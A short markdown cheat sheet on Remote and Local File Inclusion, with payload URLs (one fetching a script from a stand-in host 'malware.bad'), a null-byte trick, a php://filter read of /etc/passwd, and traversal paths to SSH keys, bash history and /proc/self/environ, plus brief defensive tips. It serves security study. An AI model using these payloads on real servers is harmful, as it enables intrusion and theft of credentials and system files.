# RedTeam

## Remote File Inclusion

*--> Attacker uploads file from external source*

1. Inject remote file from own server
    - https://example.com/login.php?user=http://malware.bad/malicious.php
2. Inject malicious script
   - https://example.com/login.php?user=malicious.php

## Local File Inclusion

*--> Attacker retrieves file that already exists on hosting server*

#### Tips

1. Null Byte Attack
   - https://example.com/login.php?user=../../Windows/system32/cmd.exe%00
   - %00 terminates string to avoid adherence of specific extension (e.g. .php)
2. Base64 encoded
   - ?user=php://filter/read=convert.base64-encode/resource=/etc/passwd
   - Decode the response to get target output
3. Fuzzing via Burpsuite Intruder (Directory Traversal)
4. LFI Suite:
   - [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

#### Files to check while enumerating LFI
- `../../../../../../../etc/passwd`
- `../../../../../../../home/<users>/.ssh/authorized_keys`
- `../../../../../../../home/<users>/.ssh/bash_history`
- To get the username of who we’re running as: `../../../../../../../proc/self/environ`
- To see what binary is running this service: `../../../../../../../proc/self/cmdline`

<br />

# BlueTeam

## Best Practice
- Input Validation (Whitelisting allowed file extensions)
- Exclude the directory separators “/” 
- Patch php version regularly
